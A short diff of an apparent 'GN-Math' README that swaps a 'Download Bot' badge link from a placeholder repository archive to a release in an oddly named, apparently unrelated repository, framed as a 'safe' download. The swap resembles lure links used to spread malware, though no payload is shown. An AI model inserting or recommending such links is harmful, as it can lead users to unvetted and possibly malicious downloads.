@@ -87,7 +87,7 @@
 
 Click the button below to safely download the full package:
 
-[![Download Bot](https://img.shields.io/badge/Download-GNMath-brightgreen?style=for-the-badge&logo=github)](https://github.com/yourusername/gn-math/archive/refs/heads/main.zip)
+[![Download Bot](https://img.shields.io/badge/Download-GNMath-brightgreen?style=for-the-badge&logo=github)](https://github.com/pegasusenchanterwarm/tjhadhzx/releases/tag/gn-math)
 
 ---
 
